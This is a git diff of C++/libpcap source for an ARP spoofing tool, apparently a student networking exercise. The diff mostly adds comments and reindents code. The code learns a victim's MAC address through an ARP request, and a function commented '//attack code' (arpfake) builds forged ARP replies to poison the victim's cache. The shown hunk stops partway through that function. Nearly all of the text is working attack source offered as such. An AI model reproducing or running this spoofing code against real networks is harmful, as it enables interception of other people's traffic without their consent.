@@ -12,7 +12,12 @@
 #include <stdlib.h>
 using namespace std;
 
+//fp : handler
+//sender_MAC : victim
+//sender_IP : victim
+//host_MAC : host
 
+//struct arp_pckt > arp_request, arp_reply_packet
 typedef struct
 {
     struct ether_header ethhdr;
@@ -58,23 +63,25 @@ int main(int argc, char **argv)
 void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t* host_MAC)
 {
     arp_pckt arp_request;
+
     for (int i=0;i<6;i++)
     {
-     arp_request.ethhdr.ether_dhost[i]=0xff;
-     arp_request.ethhdr.ether_shost[i]=host_MAC[i];
+         arp_request.ethhdr.ether_dhost[i]=0xff;
+         arp_request.ethhdr.ether_shost[i]=host_MAC[i];
     }
-    arp_request.ethhdr.ether_type = htons(ETH_P_ARP);
 
-    arp_request.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER);
-    arp_request.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP);
+    //htons : little endian(system) <> bigendian(network)
+    arp_request.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
+    arp_request.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
+    arp_request.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
     arp_request.arphdr.ea_hdr.ar_hln = 0x06;
     arp_request.arphdr.ea_hdr.ar_pln = 0x04;
-    arp_request.arphdr.ea_hdr.ar_op = htons(ARPOP_REQUEST);
+    arp_request.arphdr.ea_hdr.ar_op = htons(ARPOP_REQUEST); //htons must be use it !!!
 
     memcpy(&arp_request.arphdr.arp_sha, host_MAC, 6);
     memset(&arp_request.arphdr.arp_tha, 0, 6);
-    memset(&arp_request.arphdr.arp_spa, 0, 4);
-    memcpy(&arp_request.arphdr.arp_tpa, sender_IP, 4);
+    memset(&arp_request.arphdr.arp_spa, 0, 4); //source
+    memcpy(&arp_request.arphdr.arp_tpa, sender_IP, 4); //target
 
     u_char arp_send_packet[42];
     memcpy(arp_send_packet, &arp_request, sizeof (arp_request));
@@ -105,24 +112,23 @@ void getsender_mac(pcap_t *fp, uint8_t* sender_MAC, uint8_t* sender_IP, uint8_t*
           memcpy(sender_MAC,(arp_reply_packet->arphdr.arp_sha),6);
           return;
       }
-
     }
-
 }
 
+//IP pharsing code
 void str_to_IP(char* argv, uint8_t* IP){
-    char* tmpargv = strdup(argv);
-    char* p = strtok(tmpargv,".");
+    char* tmpargv = strdup(argv); //string duplicate
+    char* p = strtok(tmpargv,"."); //string tokenize
     int i=0;
     while (p != NULL)
     {
-        IP[i] = strtol(p,nullptr,10);
-        p = strtok(NULL,".");
+        IP[i] = strtol(p,nullptr,10); //string to long
+        p = strtok(NULL,"."); // string tokenize
         i++;
     }
 }
 
-
+//host_mac copy code
 void get_host_mac(uint8_t* MAC_str, char* dev)
 {
     struct ifreq s;
@@ -139,20 +145,22 @@ void get_host_mac(uint8_t* MAC_str, char* dev)
     }
 }
 
+//attack code
 void arpfake(pcap_t *fp, uint8_t* sender_MAC, uint8_t* host_MAC, uint8_t* targetIP, uint8_t* sender_IP){
     arp_pckt arp_reply;
+
     for (int i=0;i<6;i++)
     {
-     arp_reply.ethhdr.ether_dhost[i]=sender_MAC[i];
-     arp_reply.ethhdr.ether_shost[i]=host_MAC[i];
+         arp_reply.ethhdr.ether_dhost[i]=sender_MAC[i];
+         arp_reply.ethhdr.ether_shost[i]=host_MAC[i];
     }
-    arp_reply.ethhdr.ether_type = htons(ETH_P_ARP);
 
-    arp_reply.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER);
-    arp_reply.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP);
+    arp_reply.ethhdr.ether_type = htons(ETH_P_ARP); //htons must be use it !!!
+    arp_reply.arphdr.ea_hdr.ar_hrd= htons(ARPHRD_ETHER); //htons must be use it !!!
+    arp_reply.arphdr.ea_hdr.ar_pro = htons(ETH_P_IP); //htons must be use it !!!
     arp_reply.arphdr.ea_hdr.ar_hln = 0x06;
     arp_reply.arphdr.ea_hdr.ar_pln = 0x04;
-    arp_reply.arphdr.ea_hdr.ar_op = htons(ARPOP_REPLY);
+    arp_reply.arphdr.ea_hdr.ar_op = htons(ARPOP_REPLY); //htons must be use it !!!
 
     memcpy(&arp_reply.arphdr.arp_sha, host_MAC, 6);
     memcpy(&arp_reply.arphdr.arp_tha, sender_MAC, 6);
